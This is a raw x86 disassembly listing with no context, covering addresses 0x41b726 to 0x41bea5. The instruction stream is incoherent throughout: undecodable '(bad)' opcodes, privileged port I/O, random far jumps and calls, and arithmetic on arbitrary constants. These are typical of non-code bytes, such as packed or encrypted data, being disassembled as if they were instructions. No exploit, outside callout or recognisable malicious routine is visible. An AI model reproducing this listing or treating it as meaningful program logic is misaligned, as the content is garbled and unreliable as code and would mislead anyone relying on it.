  41b726:	pop    edi
  41b727:	scas   eax,DWORD PTR es:[edi]
  41b728:	and    eax,0xad632042
  41b72d:	test   BYTE PTR [eax],ah
  41b72f:	clc    
  41b730:	mov    ah,0x7c
  41b732:	xchg   ecx,eax
  41b733:	iret   
  41b734:	fcmovu st,st(1)
  41b736:	push   ecx
  41b737:	test   DWORD PTR [ebx],esi
  41b739:	retf   0xaf84
  41b73c:	ret    0xff29
  41b73f:	jmp    0x77f0b945
  41b744:	out    0x19,eax
  41b746:	in     eax,dx
  41b747:	jns    0x41b7b3
  41b749:	xchg   edi,eax
  41b74a:	ss jle 0x41b77c
  41b74d:	xchg   esi,eax
  41b74e:	pop    edi
  41b74f:	or     eax,0x6214c3ea
  41b754:	pop    ebp
  41b755:	fimul  WORD PTR [esi+ecx*8+0x47b9831b]
  41b75c:	dec    ebp
  41b75d:	in     al,0x81
  41b75f:	js     0x41b74e
  41b761:	and    eax,0x86075902
  41b766:	inc    eax
  41b767:	popf   
  41b768:	aad    0xf7
  41b76a:	jae    0x41b7b0
  41b76c:	dec    ecx
  41b76d:	mov    al,ds:0x4745d281
  41b772:	pop    ss
  41b773:	fdiv   DWORD PTR [eax-0x7620c33]
  41b779:	sbb    al,0x17
  41b77b:	(bad)  
  41b77c:	pop    ds
  41b77d:	push   es
  41b77e:	ret    0x9a02
  41b781:	(bad)  
  41b782:	adc    ecx,edx
  41b784:	mov    ebx,0x5b802ee0
  41b789:	cmp    DWORD PTR [ecx+0x4d338ca2],esp
  41b78f:	rcl    BYTE PTR [esi],0x69
  41b792:	(bad)
  41b795:	sub    eax,0xa401573f
  41b79a:	js     0x41b75e
  41b79c:	rol    BYTE PTR [ebx+0x12aff3a5],1
  41b7a2:	jmp    0xbbed:0x26dccbc7
  41b7a9:	out    0xde,eax
  41b7ab:	sbb    esp,DWORD PTR [ebp+esi*8-0x3d9f0de0]
  41b7b2:	rcl    DWORD PTR [edx],1
  41b7b4:	sub    cl,ah
  41b7b6:	mov    esi,0xa8ea14d9
  41b7bb:	xor    ch,BYTE PTR ds:[edx]
  41b7be:	mov    ebp,0xca0bfa88
  41b7c3:	sbb    BYTE PTR fs:[ebp-0x6df0f1a8],0xc3
  41b7cb:	add    cl,BYTE PTR [edi+0x24]
  41b7ce:	pop    ecx
  41b7cf:	or     BYTE PTR [ebx+0x5c9b377b],cl
  41b7d5:	or     al,0x15
  41b7d7:	xor    bh,dl
  41b7d9:	bound  ebp,QWORD PTR [ebx+0x6]
  41b7dc:	lea    edx,[ebx+0x18]
  41b7df:	fldcw  WORD PTR [edi]
  41b7e1:	scas   al,BYTE PTR es:[edi]
  41b7e2:	mov    edi,DWORD PTR [edi+ebx*8-0x56c8a9a4]
  41b7e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7ea:	dec    esp
  41b7eb:	dec    eax
  41b7ec:	in     al,0xd0
  41b7ee:	dec    esi
  41b7ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7f0:	jbe    0x41b7a5
  41b7f2:	pop    esp
  41b7f3:	stos   DWORD PTR es:[edi],eax
  41b7f4:	fild   WORD PTR [ebp+0x72e8c302]
  41b7fa:	adc    BYTE PTR [eax],dl
  41b7fc:	mov    edx,0x335050b
  41b801:	adc    BYTE PTR [ecx],dl
  41b803:	out    dx,eax
  41b804:	shl    DWORD PTR [ebx],1
  41b806:	pop    edi
  41b807:	clc    
  41b808:	clc    
  41b809:	fisub  DWORD PTR [eax+edx*8-0x2381b615]
  41b810:	je     0x41b7bd
  41b812:	fmulp  st(4),st
  41b814:	ficomp DWORD PTR [esi+0x2be3a93b]
  41b81a:	mov    ch,0xc8
  41b81c:	sbb    DWORD PTR ds:0x480cab6b,0x665e6ddc
  41b826:	jecxz  0x41b847
  41b828:	les    edx,FWORD PTR [esi]
  41b82a:	push   eax
  41b82b:	test   eax,eax
  41b82d:	push   ds
  41b82e:	test   eax,0x6ecd25b9
  41b833:	mov    dl,0x47
  41b835:	push   edi
  41b836:	inc    ebp
  41b837:	and    eax,0x55d71a17
  41b83c:	je     0x41b898
  41b83e:	shr    DWORD PTR [ebx],1
  41b840:	mov    dl,0x16
  41b842:	and    al,0x60
  41b844:	add    BYTE PTR [ecx+0x78],bh
  41b847:	sbb    ebx,DWORD PTR [ebp+0x3]
  41b84a:	out    0x26,eax
  41b84c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b84d:	inc    edx
  41b84e:	mov    ecx,0x7ed419d6
  41b853:	xor    dl,BYTE PTR [ecx-0x4f]
  41b856:	cmc    
  41b857:	dec    ebp
  41b858:	fdivrp st(5),st
  41b85a:	mov    al,fs:0xf7034584
  41b860:	popa   
  41b861:	mov    ?,WORD PTR [eax]
  41b863:	xchg   DWORD PTR [edx+0x6f],eax
  41b866:	fldenv [ecx+0x35658a2f]
  41b86c:	aas    
  41b86d:	clc    
  41b86e:	add    eax,DWORD PTR [esp+edx*4-0x2ace90f9]
  41b875:	shr    BYTE PTR [edx],cl
  41b877:	call   0x7ab5:0x241cec01
  41b87e:	mov    edx,0x1034fc09
  41b883:	and    DWORD PTR [ecx],ebp
  41b885:	push   edi
  41b886:	dec    edi
  41b887:	das    
  41b888:	test   DWORD PTR [eax+ecx*2],esi
  41b88b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b88c:	in     al,dx
  41b88d:	and    dl,bh
  41b88f:	fsubr  st,st(0)
  41b891:	shr    BYTE PTR [edx+0x6831b362],1
  41b897:	pop    es
  41b898:	fs shr al,1
  41b89b:	add    eax,0x4cd1ddd1
  41b8a0:	shl    BYTE PTR [ebx-0x37],0x31
  41b8a4:	popf   
  41b8a5:	sbb    eax,0xee6e1bbe
  41b8aa:	add    DWORD PTR [edx-0x7f],ebx
  41b8ad:	cmp    eax,0x5ca75075
  41b8b2:	cmp    al,0xea
  41b8b4:	jo     0x41b90e
  41b8b6:	mov    ebx,0xdef7c1ac
  41b8bb:	ficomp DWORD PTR ds:0x7386d3d1
  41b8c1:	jecxz  0x41b854
  41b8c3:	ret    
  41b8c4:	les    ebp,FWORD PTR [eax-0x42745a14]
  41b8ca:	sub    DWORD PTR [edx-0x59],ecx
  41b8cd:	mov    ecx,0x114e1a17
  41b8d2:	jmp    0xce5a5f62
  41b8d7:	pop    esp
  41b8d8:	(bad)  
  41b8d9:	xor    bl,BYTE PTR [ebx-0x2a4aeb4e]
  41b8df:	and    DWORD PTR [edx],ebp
  41b8e1:	ror    BYTE PTR [edi-0x6f],1
  41b8e4:	mov    esp,ebx
  41b8e6:	push   cs
  41b8e7:	inc    edi
  41b8e8:	pusha  
  41b8e9:	lock inc esp
  41b8eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8ec:	jnp    0x41b8f1
  41b8ee:	push   0x1591d23e
  41b8f3:	sbb    DWORD PTR [edx+0x55],ebx
  41b8f6:	call   0x831b58c9
  41b8fb:	arpl   WORD PTR [ecx],ax
  41b8fd:	xor    al,0x9
  41b8ff:	aad    0xb1
  41b901:	in     al,dx
  41b902:	stos   DWORD PTR es:[edi],eax
  41b903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b904:	push   cs
  41b905:	popf   
  41b906:	dec    ebp
  41b907:	shl    BYTE PTR [ecx+ebp*8+0x68],0xd1
  41b90c:	dec    eax
  41b90d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b90e:	leave  
  41b90f:	mov    bl,0xfe
  41b911:	xchg   esp,eax
  41b912:	call   0x163dd5d
  41b917:	jmp    0x51c24223
  41b91c:	rcr    DWORD PTR gs:[ecx+edx*8-0x663f9f97],cl
  41b924:	daa    
  41b925:	int3   
  41b926:	cmp    ebx,edi
  41b928:	mov    ebp,0xd4b3c567
  41b92d:	pop    ss
  41b92e:	and    edi,DWORD PTR [ecx-0x33]
  41b931:	pop    es
  41b932:	rol    edx,cl
  41b934:	pop    ebp
  41b935:	pop    eax
  41b936:	mov    al,0x95
  41b938:	sbb    esi,esi
  41b93a:	test   BYTE PTR [ecx],bl
  41b93c:	pop    ebp
  41b93d:	hlt    
  41b93e:	clc    
  41b93f:	sub    eax,0xf4788730
  41b944:	out    dx,al
  41b945:	into   
  41b946:	fmul   st(0),st
  41b948:	in     al,dx
  41b949:	rcr    esi,cl
  41b94b:	xchg   edx,eax
  41b94c:	dec    edx
  41b94d:	push   ebp
  41b94e:	jb     0x41b8f0
  41b950:	mov    edi,esi
  41b952:	sbb    ch,BYTE PTR [eax+ebp*4-0x10]
  41b956:	mov    dl,0x46
  41b958:	mov    edx,0xed1e913
  41b95d:	cmp    BYTE PTR [edx+0x31],al
  41b960:	and    esp,DWORD PTR [ebx-0x4e701637]
  41b966:	dec    esi
  41b967:	cs xlat BYTE PTR ds:[ebx]
  41b96a:	imul   eax,DWORD PTR [ebx],0xfe305f90
  41b970:	xchg   ebp,eax
  41b971:	jge    0x41b9df
  41b973:	mov    dl,0xd4
  41b975:	push   ebx
  41b976:	(bad)  
  41b978:	or     ebp,DWORD PTR [esi]
  41b97a:	adc    al,0x7b
  41b97c:	mov    sp,0xfd8
  41b980:	(bad)  
  41b981:	cmp    eax,0xba818491
  41b986:	mov    BYTE PTR [ecx-0x65],bl
  41b989:	cmp    DWORD PTR [eax+0x4ab2b65d],0x57
  41b990:	test   eax,0xef18e2a5
  41b995:	xor    edx,esi
  41b997:	pop    ds
  41b998:	mov    ah,0xdd
  41b99a:	fwait
  41b99b:	fwait
  41b99c:	cmp    eax,0x8239e4b9
  41b9a1:	mov    edx,0x162a275
  41b9a6:	ret    
  41b9a7:	sub    BYTE PTR [ebp-0x3],al
  41b9aa:	pop    esi
  41b9ab:	or     esi,DWORD PTR [ebx+0xa]
  41b9ae:	pushf  
  41b9af:	cmc    
  41b9b0:	xor    eax,0x4bbaa5
  41b9b5:	test   al,0xcc
  41b9b7:	push   0x8df26a5f
  41b9bc:	and    esi,DWORD PTR [esi]
  41b9be:	adc    al,0x44
  41b9c0:	adc    eax,0x6f7a1121
  41b9c5:	cli    
  41b9c6:	out    0xbe,al
  41b9c8:	or     DWORD PTR [esi-0x2dbca54e],0xffffffa6
  41b9cf:	pop    edi
  41b9d0:	or     DWORD PTR [edi-0x18],edx
  41b9d3:	jge    0x41b959
  41b9d5:	mov    ds:0x40e7b277,eax
  41b9da:	jmp    0x41b99a
  41b9dc:	mov    fs,WORD PTR [ecx]
  41b9de:	mov    ebx,0xb11f3410
  41b9e3:	scas   eax,DWORD PTR es:[edi]
  41b9e4:	dec    edx
  41b9e5:	call   FWORD PTR [ecx+0x29]
  41b9e8:	imul   BYTE PTR [ebx]
  41b9ea:	xor    BYTE PTR [esi+0x26a24a7f],bl
  41b9f0:	push   ecx
  41b9f1:	mov    edi,0x9922c1c5
  41b9f6:	xchg   esi,eax
  41b9f7:	dec    ecx
  41b9f8:	sti    
  41b9f9:	xor    ebx,0x9b837b5d
  41b9ff:	dec    ebx
  41ba00:	cmc    
  41ba01:	push   esp
  41ba02:	test   eax,0xc0388fb7
  41ba07:	fimul  WORD PTR [edi+ebx*4+0x42]
  41ba0b:	xchg   esi,eax
  41ba0c:	mov    ebx,0xa94298c0
  41ba11:	push   0xd5a3e158
  41ba16:	xor    DWORD PTR [ebx+0x20e6a8c5],ebx
  41ba1c:	aas    
  41ba1d:	adc    bh,BYTE PTR [esi+eax*8-0x12]
  41ba21:	add    eax,0xbabd81e8
  41ba26:	call   0x71c2:0xa0163050
  41ba2d:	in     al,0x6f
  41ba2f:	mov    dl,0xb3
  41ba31:	xchg   BYTE PTR [ebp+0x11b39954],bl
  41ba37:	pop    ds
  41ba38:	loope  0x41ba91
  41ba3a:	xchg   edi,eax
  41ba3b:	sahf   
  41ba3c:	xchg   BYTE PTR [eax+0x416ccd43],ah
  41ba42:	fwait
  41ba43:	(bad)  
  41ba44:	xor    DWORD PTR [ebp+0x1],esp
  41ba47:	cdq    
  41ba48:	mov    ecx,esp
  41ba4a:	add    BYTE PTR [edx+eax*2-0x74],ah
  41ba4e:	pop    ecx
  41ba4f:	mov    bh,0xa1
  41ba51:	popa   
  41ba52:	pushf  
  41ba53:	and    ax,0xbf7e
  41ba57:	xchg   edx,eax
  41ba58:	out    dx,eax
  41ba59:	dec    ecx
  41ba5a:	test   bl,ah
  41ba5c:	jae    0x41b9de
  41ba5e:	into   
  41ba5f:	ret    
  41ba60:	dec    eax
  41ba61:	add    BYTE PTR ds:0xfd0c4c7b,0xc6
  41ba68:	imul   ebp,DWORD PTR [ecx],0x7d
  41ba6b:	push   ebp
  41ba6c:	js     0x41bab9
  41ba6e:	popa   
  41ba6f:	inc    edi
  41ba70:	jp     0x41ba37
  41ba72:	sub    ebp,ebp
  41ba74:	out    dx,al
  41ba75:	xor    ecx,edi
  41ba77:	xchg   BYTE PTR [edi+0x56ac9e34],dl
  41ba7d:	inc    eax
  41ba7e:	push   cs
  41ba7f:	aam    0xf4
  41ba81:	dec    ebx
  41ba82:	mov    ch,0x33
  41ba84:	inc    esp
  41ba85:	dec    ebx
  41ba86:	add    eax,0x596de5ed
  41ba8b:	inc    ebx
  41ba8c:	fidivr WORD PTR [eax]
  41ba8e:	mov    eax,0x21e07045
  41ba93:	aas    
  41ba94:	inc    esi
  41ba95:	dec    ecx
  41ba96:	imul   edx,DWORD PTR [ebp-0x31],0x36
  41ba9a:	stos   BYTE PTR es:[edi],al
  41ba9b:	stc    
  41ba9c:	ret    0x81ed
  41ba9f:	pop    ebx
  41baa0:	adc    esp,DWORD PTR [edi-0xf7e3a02]
  41baa6:	jb     0x41ba28
  41baa8:	leave  
  41baa9:	pop    ecx
  41baaa:	gs sub ch,bh
  41baad:	(bad)  
  41baae:	xor    ah,BYTE PTR [ebp-0x2fb92ca]
  41bab4:	sub    ah,BYTE PTR [ecx+esi*8]
  41bab7:	js     0x41ba3a
  41bab9:	jns    0x41ba96
  41babb:	adc    DWORD PTR [ebx],ecx
  41babd:	sub    al,0x9a
  41babf:	push   edx
  41bac0:	sti    
  41bac1:	shr    dl,cl
  41bac3:	repnz dec edi
  41bac5:	je     0x41bafc
  41bac7:	and    cl,dh
  41bac9:	ins    DWORD PTR es:[edi],dx
  41baca:	fstp   DWORD PTR [edi]
  41bacc:	ret    0x67d4
  41bacf:	add    DWORD PTR [ebx-0x48932bfe],esp
  41bad5:	ss push ds
  41bad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bad8:	xor    BYTE PTR [ebp-0x42],bl
  41badb:	(bad)  
  41badc:	adc    al,0xa0
  41bade:	push   0xffffff81
  41bae0:	ins    DWORD PTR es:[edi],dx
  41bae1:	jnp    0x41bb62
  41bae3:	pop    esp
  41bae4:	test   DWORD PTR [edx+0x7f],esi
  41bae7:	and    eax,0x2bae8bbc
  41baec:	enter  0xefa2,0x6f
  41baf0:	outs   dx,DWORD PTR ds:[esi]
  41baf1:	adc    ecx,edx
  41baf3:	inc    edx
  41baf4:	push   eax
  41baf5:	add    dh,BYTE PTR [edx+0x7f4ef6e2]
  41bafb:	mov    ebx,0x3136e231
  41bb00:	pop    esp
  41bb01:	outs   dx,BYTE PTR ds:[esi]
  41bb02:	(bad)  
  41bb03:	sti    
  41bb04:	rol    BYTE PTR [esp+esi*2],cl
  41bb07:	sub    BYTE PTR [esi+0x73],bh
  41bb0a:	or     DWORD PTR [ebp+edi*2+0x13],edx
  41bb0e:	test   al,0x41
  41bb10:	push   esp
  41bb11:	mov    al,0x75
  41bb13:	pop    ebx
  41bb14:	sub    ah,BYTE PTR [edi]
  41bb16:	inc    ebx
  41bb17:	outs   dx,DWORD PTR ds:[esi]
  41bb18:	and    BYTE PTR [ebx-0x80],ah
  41bb1b:	lds    ebx,FWORD PTR [eax]
  41bb1d:	cmp    BYTE PTR [bp+si],ah
  41bb20:	jmp    0x3794:0xa3ff569d
  41bb27:	and    eax,0xb51915b6
  41bb2c:	xchg   ebp,eax
  41bb2d:	stc    
  41bb2e:	es mov bl,0x5d
  41bb31:	(bad)  
  41bb33:	cmc    
  41bb34:	dec    eax
  41bb35:	sub    al,0x97
  41bb37:	cmove  esi,DWORD PTR [ebp+ebx*4-0x2228d3de]
  41bb3f:	clc    
  41bb40:	test   DWORD PTR [eax+ebp*2],edi
  41bb43:	test   BYTE PTR [esi+0x53],cl
  41bb46:	mov    eax,ds:0x6666c6cf
  41bb4b:	or     BYTE PTR [ebp+0x46f962af],bh
  41bb51:	cdq    
  41bb52:	mov    esp,0xa98f7b4f
  41bb57:	dec    esi
  41bb58:	xor    DWORD PTR [eax+0x4d],esi
  41bb5b:	push   edx
  41bb5c:	cli    
  41bb5d:	jle    0x41bbb0
  41bb5f:	sbb    DWORD PTR [edx+0x75],0xd6e8ba47
  41bb66:	xor    ebp,edx
  41bb68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb69:	in     al,0xbb
  41bb6b:	lock cs xchg ebp,eax
  41bb6e:	add    BYTE PTR [eax],al
  41bb70:	add    BYTE PTR [eax],al
  41bb72:	out    0x40,al
  41bb74:	sbb    eax,0xee5dbf15
  41bb79:	repz adc eax,0xca442583
  41bb7f:	sbb    ebx,edi
  41bb81:	cmp    DWORD PTR [ecx-0xbfffec9],ecx
  41bb87:	add    al,0x0
  41bb89:	add    bh,ch
  41bb8b:	icebp  
  41bb8c:	xor    eax,DWORD PTR [edx]
  41bb8e:	addr16 mov ds:0x598,eax
  41bb92:	clc    
  41bb93:	push   ebx
  41bb94:	mov    ebp,DWORD PTR [edi+0x5f0eb956]
  41bb9a:	or     al,0x4a
  41bb9c:	dec    esp
  41bb9d:	movsx  edi,WORD PTR [eax]
  41bba0:	fnstsw WORD PTR [edx-0x25]
  41bba3:	jns    0x41bb26
  41bba5:	in     ax,0xb0
  41bba8:	adc    eax,0xca5bddf3
  41bbad:	jns    0x41bb69
  41bbaf:	lods   al,BYTE PTR ds:[esi]
  41bbb0:	lea    ebx,[edx-0x5d]
  41bbb3:	mov    edx,0x8f7f55b5
  41bbb8:	xchg   DWORD PTR [eax+0x79693aa6],ecx
  41bbbe:	fcomp  DWORD PTR [edi+0x1f5300b6]
  41bbc4:	mov    esi,0xe309acea
  41bbc9:	jno    0x41bbdd
  41bbcb:	pop    esp
  41bbcc:	jnp    0x41bb97
  41bbce:	imul   eax,DWORD PTR [edi+0x5940e877],0x18023cb4
  41bbd8:	pop    ss
  41bbd9:	inc    edi
  41bbda:	ficomp WORD PTR [ecx+0xcffbce5]
  41bbe0:	add    eax,0x9fd6ef08
  41bbe5:	dec    edx
  41bbe6:	mov    al,ds:0x54a059f7
  41bbeb:	xor    esp,DWORD PTR [eax-0x7b]
  41bbee:	jae    0x41bbe8
  41bbf0:	in     eax,dx
  41bbf1:	(bad)  
  41bbf2:	dec    edi
  41bbf3:	push   edx
  41bbf4:	jge    0x41bc0c
  41bbf6:	scas   eax,DWORD PTR es:[edi]
  41bbf7:	dec    ebp
  41bbf8:	inc    ecx
  41bbf9:	or     ebx,DWORD PTR [edi+eax*8-0x59]
  41bbfd:	mov    eax,ds:0x55ef9f1c
  41bc02:	scas   eax,DWORD PTR es:[edi]
  41bc03:	(bad)
  41bc06:	and    bl,dl
  41bc08:	icebp  
  41bc09:	popf   
  41bc0a:	das    
  41bc0b:	cwde   
  41bc0c:	loopne 0x41bb91
  41bc0e:	adc    esp,DWORD PTR [eax]
  41bc10:	or     dh,BYTE PTR [eax+ebx*4+0x1b]
  41bc14:	repz out 0xc5,eax
  41bc17:	test   DWORD PTR [esi-0x49d9a4b3],edi
  41bc1d:	or     DWORD PTR [esi],esp
  41bc1f:	repz mov ss,WORD PTR [edx+0x3f]
  41bc23:	dec    eax
  41bc24:	nop
  41bc25:	cmp    BYTE PTR [ecx-0x1a715415],0x51
  41bc2c:	in     al,0x2
  41bc2e:	stc    
  41bc2f:	cmp    esp,ebp
  41bc31:	dec    eax
  41bc32:	test   eax,0xc4578235
  41bc37:	push   ss
  41bc38:	jb     0x41bbc8
  41bc3a:	(bad)  
  41bc3b:	sbb    edi,DWORD PTR [esi+0x4c2dd9c8]
  41bc41:	push   edx
  41bc42:	stos   DWORD PTR es:[edi],eax
  41bc43:	xlat   BYTE PTR ds:[ebx]
  41bc44:	fdivr  st(2),st
  41bc46:	out    0x25,al
  41bc48:	lahf   
  41bc49:	dec    edi
  41bc4a:	inc    ebx
  41bc4b:	jge    0x41bbed
  41bc4d:	mov    ds:0xd714c667,al
  41bc52:	push   ss
  41bc53:	jb     0x41bcb4
  41bc55:	push   ss
  41bc56:	and    ecx,edi
  41bc58:	(bad)
  41bc5b:	fnstsw WORD PTR [ecx+edx*1+0x8]
  41bc5f:	jl     0x41bc91
  41bc61:	mov    edx,0xad6d8fb8
  41bc66:	add    al,0x62
  41bc68:	sub    edx,DWORD PTR [esi-0x58aa5226]
  41bc6e:	iret   
  41bc6f:	mov    ah,0x7c
  41bc71:	jecxz  0x41bc82
  41bc73:	shl    DWORD PTR [ecx-0x5d0e1d7e],0x1c
  41bc7a:	(bad)  ds:0x3b58a8c1
  41bc80:	mov    ecx,0xa5a1fd8f
  41bc85:	adc    bh,BYTE PTR [esi]
  41bc87:	adc    dh,BYTE PTR [ebx-0x67]
  41bc8a:	mov    WORD PTR [ecx-0x3b0ccdd3],?
  41bc90:	(bad)  
  41bc91:	repz adc al,0x39
  41bc94:	stc    
  41bc95:	ds xchg edi,eax
  41bc97:	jbe    0x41bcfb
  41bc99:	loop   0x41bc20
  41bc9b:	(bad)  
  41bc9c:	call   FWORD PTR [ecx-0x19]
  41bc9f:	cdq    
  41bca0:	je     0x41bcdc
  41bca2:	and    eax,0xf4b3c6ce
  41bca7:	jp     0x41bcb8
  41bca9:	test   DWORD PTR [eax],ebp
  41bcab:	ds pop es
  41bcad:	out    0x37,eax
  41bcaf:	xchg   ebx,eax
  41bcb0:	data16 and ch,ah
  41bcb3:	call   0x1355:0xfeb6215
  41bcba:	ret    0x6458
  41bcbd:	jge    0x41bcc1
  41bcbf:	retf   0x8b15
  41bcc2:	in     eax,0x10
  41bcc4:	sar    DWORD PTR [esp+edi*2-0x630069a8],1
  41bccb:	mov    cl,0x88
  41bccd:	jbe    0x41bc9a
  41bccf:	out    dx,eax
  41bcd0:	mov    ds:0xabe7e894,al
  41bcd5:	xchg   edx,eax
  41bcd6:	mov    ds:0x4db59d0f,eax
  41bcdb:	cmc    
  41bcdc:	sub    al,0xba
  41bcde:	jle    0x41bd13
  41bce0:	aas    
  41bce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bce2:	test   edi,0x22a65ff4
  41bce8:	in     al,0x26
  41bcea:	(bad)  
  41bceb:	pusha  
  41bcec:	xchg   ebx,eax
  41bced:	add    BYTE PTR [edx-0x2a],0x8b
  41bcf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcf2:	inc    ebx
  41bcf3:	sub    cl,BYTE PTR [ebx+0xebe918d]
  41bcf9:	xor    eax,0x7b904a2f
  41bcfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcff:	sbb    eax,0x62a1e7c8
  41bd04:	sub    eax,0x6a23edfb
  41bd09:	mov    bl,0xde
  41bd0b:	mov    eax,0xbdfcfb68
  41bd10:	jmp    0x62950e6b
  41bd15:	fiadd  WORD PTR [ebp-0x501a463]
  41bd1b:	fnstsw WORD PTR [edx]
  41bd1d:	stos   BYTE PTR es:[edi],al
  41bd1e:	inc    ecx
  41bd1f:	mov    DWORD PTR [esi+0x3b],ecx
  41bd22:	cmp    ebx,DWORD PTR [ebx+ebp*8-0x4f]
  41bd26:	enter  0xc432,0x8c
  41bd2a:	jge    0x41bcf2
  41bd2c:	fisub  DWORD PTR ds:0x8b749a20
  41bd32:	sbb    al,0xfc
  41bd34:	sti    
  41bd35:	fcmovnbe st,st(0)
  41bd37:	clc    
  41bd38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd39:	rol    edi,cl
  41bd3b:	adc    al,0xd3
  41bd3d:	das    
  41bd3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3f:	cmp    eax,0x179dc5a7
  41bd44:	push   ds
  41bd45:	adc    BYTE PTR [edi+0x33],dl
  41bd48:	repnz imul eax,DWORD PTR [esp+ebp*1-0xe],0xae895d95
  41bd51:	xor    eax,DWORD PTR [edi+ebp*2-0x6f]
  41bd55:	cli    
  41bd56:	pop    edx
  41bd57:	jp     0x41bd39
  41bd59:	mov    ebx,esi
  41bd5b:	out    0x4c,eax
  41bd5d:	fwait
  41bd5e:	ds test eax,0xff27caca
  41bd64:	and    al,0x72
  41bd66:	hlt    
  41bd67:	ins    BYTE PTR es:[edi],dx
  41bd68:	pop    es
  41bd69:	mov    dh,0xf4
  41bd6b:	cmp    dl,BYTE PTR [ebx-0x26a5778d]
  41bd71:	inc    eax
  41bd72:	xchg   DWORD PTR [edi+0x8],eax
  41bd75:	loope  0x41bdd9
  41bd77:	call   0xfc2fe436
  41bd7c:	daa    
  41bd7d:	mov    esp,0xd78b195b
  41bd82:	xchg   ebp,eax
  41bd83:	(bad)  
  41bd85:	mov    dh,0xca
  41bd87:	idiv   ch
  41bd89:	stos   DWORD PTR es:[edi],eax
  41bd8a:	add    esp,esp
  41bd8c:	sub    al,0xf1
  41bd8e:	jmp    0x9c0f:0xe4f824e0
  41bd95:	fstp   QWORD PTR [ebx-0x677d046e]
  41bd9b:	mov    BYTE PTR [ecx],cl
  41bd9d:	sbb    BYTE PTR [esi],bl
  41bd9f:	(bad)  
  41bda0:	popf   
  41bda1:	ins    BYTE PTR es:[edi],dx
  41bda2:	add    esi,DWORD PTR [eax+0x7659423f]
  41bda8:	popa   
  41bda9:	adc    BYTE PTR [esi+ebx*4+0x664691c6],al
  41bdb0:	ds ret 
  41bdb2:	cmp    al,ch
  41bdb4:	xchg   DWORD PTR [ebx-0x57],ebx
  41bdb7:	dec    edx
  41bdb8:	(bad)  
  41bdb9:	and    al,0x8d
  41bdbb:	out    dx,eax
  41bdbc:	data16 jb 0x41bdec
  41bdbf:	test   BYTE PTR [eax+0x70],dl
  41bdc2:	lods   al,BYTE PTR ds:[esi]
  41bdc3:	mov    ecx,0x31f13bc8
  41bdc8:	push   ds
  41bdc9:	jbe    0x41bd8d
  41bdcb:	cmp    al,0x13
  41bdcd:	add    eax,DWORD PTR [eax-0x3ba9ea93]
  41bdd3:	push   ds
  41bdd4:	mov    BYTE PTR [ebx],bl
  41bdd6:	clc    
  41bdd7:	jg     0x41be1d
  41bdd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdda:	in     al,0x8d
  41bddc:	iret   
  41bddd:	(bad)  
  41bdde:	std    
  41bddf:	pop    es
  41bde0:	jns    0x41bd93
  41bde2:	inc    esp
  41bde3:	je     0x41be58
  41bde5:	xchg   esp,eax
  41bde6:	ror    DWORD PTR [edi+0x10106333],1
  41bdec:	jmp    0x966192f5
  41bdf1:	adc    eax,0x462513af
  41bdf6:	add    ah,al
  41bdf8:	add    DWORD PTR [ecx],0x11
  41bdfb:	fnstsw WORD PTR [ecx]
  41bdfd:	in     al,dx
  41bdfe:	out    0x9f,al
  41be00:	xchg   edi,eax
  41be01:	out    0x36,al
  41be03:	cmp    esp,DWORD PTR [ebx-0x3f]
  41be06:	ret    
  41be07:	sbb    eax,0xfde6bb7b
  41be0c:	repnz dec edi
  41be0e:	shl    BYTE PTR [edi+0x5084bcd6],1
  41be14:	scas   al,BYTE PTR es:[edi]
  41be15:	cmp    DWORD PTR [ebx],ebx
  41be17:	inc    ebx
  41be18:	push   ebx
  41be19:	sbb    al,0xfd
  41be1b:	out    dx,eax
  41be1c:	call   0x88ab:0xb569dac3
  41be23:	pop    ebp
  41be24:	mov    ds:0x10f739f9,al
  41be29:	test   DWORD PTR ds:0x92fcf64f,edi
  41be2f:	je     0x41be22
  41be31:	push   ebx
  41be32:	mov    BYTE PTR ds:0xa6d8752b,dl
  41be38:	aas    
  41be39:	sbb    eax,0xdf63e8a3
  41be3e:	inc    BYTE PTR [eax+0x2b]
  41be41:	dec    esi
  41be42:	imul   esp,DWORD PTR [esi+eiz*2+0x5c],0x3c93e68c
  41be4a:	add    DWORD PTR [ebp-0x74],edi
  41be4d:	sbb    eax,0x89535ca9
  41be52:	xor    DWORD PTR [esi],ebx
  41be54:	(bad)  
  41be55:	popf   
  41be56:	das    
  41be57:	cld    
  41be58:	outs   dx,DWORD PTR ds:[esi]
  41be59:	aas    
  41be5a:	jb     0x41be6d
  41be5c:	xchg   esp,eax
  41be5d:	jmp    0x41beb8
  41be5f:	js     0x41be26
  41be61:	sub    bh,cl
  41be63:	retf   
  41be64:	dec    edi
  41be65:	jo     0x41be74
  41be67:	xchg   ebp,eax
  41be68:	push   ss
  41be69:	and    ch,BYTE PTR [edx]
  41be6b:	js     0x41becd
  41be6d:	pop    eax
  41be6e:	lea    esi,[eax+0x2cac2196]
  41be74:	std    
  41be75:	out    0x2b,al
  41be77:	dec    esi
  41be78:	dec    BYTE PTR [ebp+0x40d6ff70]
  41be7e:	lahf   
  41be7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be80:	pushf  
  41be81:	add    al,0x98
  41be83:	out    0xae,al
  41be85:	in     eax,dx
  41be86:	mov    edi,0x8f545d2a
  41be8b:	mov    ds:0xcfc73526,al
  41be90:	int    0x45
  41be92:	sbb    al,0xe6
  41be94:	test   eax,0xea38842c
  41be99:	add    BYTE PTR [edx],0xda
  41be9c:	pop    ecx
  41be9d:	and    ebp,DWORD PTR ds:[eax-0xe]
  41bea1:	aad    0x4d
  41bea3:	inc    ebp
  41bea4:	aas    
  41bea5:	pop    esi
